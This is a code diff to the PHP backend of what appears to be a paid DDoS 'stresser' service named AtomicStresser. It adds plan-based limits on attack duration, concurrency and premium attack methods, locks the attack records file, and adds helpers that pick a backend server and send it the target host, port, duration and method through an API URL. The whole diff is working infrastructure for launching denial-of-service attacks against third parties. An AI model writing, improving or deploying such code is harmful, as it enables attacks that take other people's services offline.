@@ -53,6 +53,7 @@ if ($method_req === 'POST') {
                 break;
             }
         }
+        unset($attack);
         write_json('attacks.json', $attacks);
         json_response(['message' => 'Attack stopped']);
     }
@@ -85,13 +86,55 @@ if ($method_req === 'POST') {
     if ($time > $user['max_seconds']) {
         json_error('Time exceeds your plan limit (' . $user['max_seconds'] . 's max)');
     }
+
+    // Validate min_seconds per plan (#8)
+    $plans = read_json('plans.json');
+    $min_seconds = 10;
+    foreach ($plans as $plan) {
+        if ($plan['name'] === $user['plan']) {
+            $min_seconds = intval($plan['min_seconds'] ?? 10);
+            break;
+        }
+    }
+    if ($time < $min_seconds) {
+        json_error("Time must be at least {$min_seconds} seconds for your plan");
+    }
     
-    if ($concurrents > $user['max_concurrents']) {
+    if ($concurrents < 1 || $concurrents > $user['max_concurrents']) {
         json_error('Concurrents exceed your plan limit (' . $user['max_concurrents'] . ' max)');
     }
     
-    // Check concurrent running attacks
-    $attacks = read_json('attacks.json');
+    // Verify method exists and check premium access
+    $methods = read_json('methods.json');
+    $valid_method = false;
+    $method_obj = null;
+    foreach ($methods as $m) {
+        if ($m['name'] === $method) {
+            $valid_method = true;
+            $method_obj = $m;
+            if ($m['premium'] && $user['plan'] === 'Starter') {
+                json_error('This method requires a premium plan');
+            }
+            break;
+        }
+    }
+    
+    if (!$valid_method) {
+        json_error('Invalid method');
+    }
+
+    // Lock attacks.json for atomic concurrent-count check + insert (#7)
+    $attacks_path = DATA_DIR . 'attacks.json';
+    $fp = @fopen($attacks_path, 'c+');
+    if (!$fp) {
+        json_error('Server error: could not open attacks file', 500);
+    }
+    flock($fp, LOCK_EX);
+
+    $content = '';
+    while (!feof($fp)) $content .= fread($fp, 8192);
+    $attacks = json_decode($content, true) ?: [];
+
     $now = time();
     $running_count = 0;
     foreach ($attacks as $attack) {
@@ -105,24 +148,9 @@ if ($method_req === 'POST') {
     }
     
     if ($running_count >= $user['max_concurrents']) {
+        flock($fp, LOCK_UN);
+        fclose($fp);
         json_error('Maximum concurrent attacks reached');
-    }
-    
-    // Verify method exists
-    $methods = read_json('methods.json');
-    $valid_method = false;
-    foreach ($methods as $m) {
-        if ($m['name'] === $method) {
-            $valid_method = true;
-            if ($m['premium'] && $user['plan'] === 'Starter') {
-                json_error('This method requires a premium plan');
-            }
-            break;
-        }
-    }
-    
-    if (!$valid_method) {
-        json_error('Invalid method');
     }
     
     $new_attack = [
@@ -135,13 +163,108 @@ if ($method_req === 'POST') {
         'concurrents' => $concurrents,
         'layer' => $layer,
         'start_time' => date('c'),
-        'status' => 'running'
+        'status' => 'running',
+        'server_id' => null,
+        'server_response' => null
     ];
     
     $attacks[] = $new_attack;
-    write_json('attacks.json', $attacks);
+
+    ftruncate($fp, 0);
+    rewind($fp);
+    fwrite($fp, json_encode($attacks, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+    fflush($fp);
+    flock($fp, LOCK_UN);
+    fclose($fp);
+
+    // Dispatch to backend server
+    $server = find_server_for_attack($method, $layer);
+    if ($server) {
+        $dispatch = dispatch_to_server($server, $new_attack);
+        // Update attack record with server info (best-effort, no lock needed for metadata)
+        $attacks = read_json('attacks.json');
+        foreach ($attacks as &$a) {
+            if ($a['id'] === $new_attack['id']) {
+                $a['server_id'] = $server['id'];
+                $a['server_response'] = $dispatch['success'] ? 'ok' : ('error: ' . substr($dispatch['error'] ?: (string)$dispatch['status_code'], 0, 100));
+                break;
+            }
+        }
+        unset($a);
+        write_json('attacks.json', $attacks);
+        $new_attack['server_id'] = $server['id'];
+    }
     
     json_response(['message' => 'Attack launched', 'attack' => $new_attack], 201);
 }
 
 json_error('Method not allowed', 405);
+
+// =================== Helper: find a compatible backend server ===================
+
+function find_server_for_attack($method, $layer) {
+    $servers = read_json('servers.json');
+    foreach ($servers as $server) {
+        if (empty($server['enabled'])) continue;
+        // Check layer compatibility
+        $srv_layer = $server['layer'] ?? 'Both';
+        if ($srv_layer !== 'Both' && $srv_layer !== $layer) continue;
+        // Empty methods list = server accepts all methods
+        $srv_methods = $server['methods'] ?? [];
+        if (!empty($srv_methods) && !in_array($method, $srv_methods, true)) continue;
+        return $server;
+    }
+    return null;
+}
+
+// =================== Helper: dispatch GET request to backend server ===================
+
+function dispatch_to_server($server, $attack) {
+    $url = $server['api_url'] ?? '';
+    if (empty($url)) {
+        return ['success' => false, 'status_code' => 0, 'response' => '', 'error' => 'No URL configured'];
+    }
+
+    $replacements = [
+        '{host}'        => urlencode($attack['target']),
+        '{ip}'          => urlencode($attack['target']),
+        '{port}'        => urlencode((string)$attack['port']),
+        '{time}'        => urlencode((string)$attack['time']),
+        '{method}'      => urlencode($attack['method']),
+        '{apikey}'      => urlencode($server['api_key'] ?? ''),
+        '{key}'         => urlencode($server['api_key'] ?? ''),
+        '{concurrents}' => urlencode((string)$attack['concurrents']),
+    ];
+    $url = str_replace(array_keys($replacements), array_values($replacements), $url);
+
+    if (!function_exists('curl_init')) {
+        // Fallback: file_get_contents
+        $ctx = stream_context_create(['http' => ['timeout' => 10, 'ignore_errors' => true]]);
+        $response = @file_get_contents($url, false, $ctx);
+        $ok = $response !== false;
+        return ['success' => $ok, 'status_code' => 0, 'response' => (string)$response, 'error' => $ok ? '' : 'file_get_contents failed'];
+    }
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL            => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT        => 10,
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS      => 3,
+        CURLOPT_USERAGENT      => 'AtomicStresser/1.0',
+    ]);
+    $response  = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error     = curl_error($ch);
+    curl_close($ch);
+
+    return [
+        'success'     => ($http_code >= 200 && $http_code < 300),
+        'status_code' => $http_code,
+        'response'    => (string)$response,
+        'error'       => $error,
+    ];
+}
